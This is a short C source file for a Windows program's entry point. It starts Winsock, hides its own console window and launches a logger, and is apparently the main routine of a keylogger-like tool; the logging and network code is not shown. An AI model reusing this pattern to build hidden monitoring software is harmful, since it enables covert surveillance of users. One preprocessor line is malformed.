//#include "logger.h"

#include "client.h"
#include "logger.h"


int WINAPI WinMain(HINSTANCE thisinstance, HINSTANCE previnstance,LPSTR cmdline, int ncmdshow){

	if(startWinSock()){
		printf("Started winsock "); 
	}else{
		printf("winsock startup failed "); 
	}

	#ifdef DEBUG && DEBUG == 0
		HWND window;
    	AllocConsole();
    	window = FindWindowA("ConsoleWindowClass", NULL);
    	ShowWindow(window,0);
	#endif 

    startLogger();

    return 0; 

}
